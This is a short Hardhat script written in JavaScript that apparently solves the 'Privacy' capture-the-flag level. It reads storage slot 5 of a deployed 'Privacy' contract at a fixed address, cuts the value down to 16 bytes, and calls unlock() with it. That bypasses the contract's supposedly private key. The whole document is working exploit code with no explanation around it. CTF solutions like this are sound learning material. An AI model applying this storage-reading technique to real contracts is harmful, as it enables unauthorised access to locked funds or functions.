import { ethers } from "hardhat";

async function main() {
  const privacy = await ethers.getContractAt("Privacy", "0x435da4f230260863c530A16931A1FB413490481f");

  const data2 = await ethers.provider.getStorageAt(privacy.address, 5);
  const key = ethers.utils.arrayify(data2.slice(0, 34));

  const tx = await privacy.unlock(key);
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
